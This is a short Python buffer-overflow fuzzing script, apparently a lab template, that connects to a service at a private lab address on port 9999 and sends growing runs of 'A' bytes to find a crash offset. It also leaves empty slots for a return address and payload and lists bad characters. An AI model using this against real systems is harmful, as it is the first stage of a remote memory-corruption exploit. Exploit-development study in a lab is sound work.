import socket
import os
import time

ip = "192.168.56.101"
port = 9999

all_chars = bytearray(range(1,256))
bad_chars = [b"\x11"]

prefix = ""
offset = 100
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.send(bytes("client\r\n", "latin-1"))
  data = s.recv(1024).decode()
  print(data)
  while(True):
      print("fuzzing with {} bytes".format(len(buffer)))
      s.send(bytes(buffer, "latin-1"))
      s.recv(1024)
      buffer += "A"*100
      time.sleep(1)
except:
  print("Could not connect.")
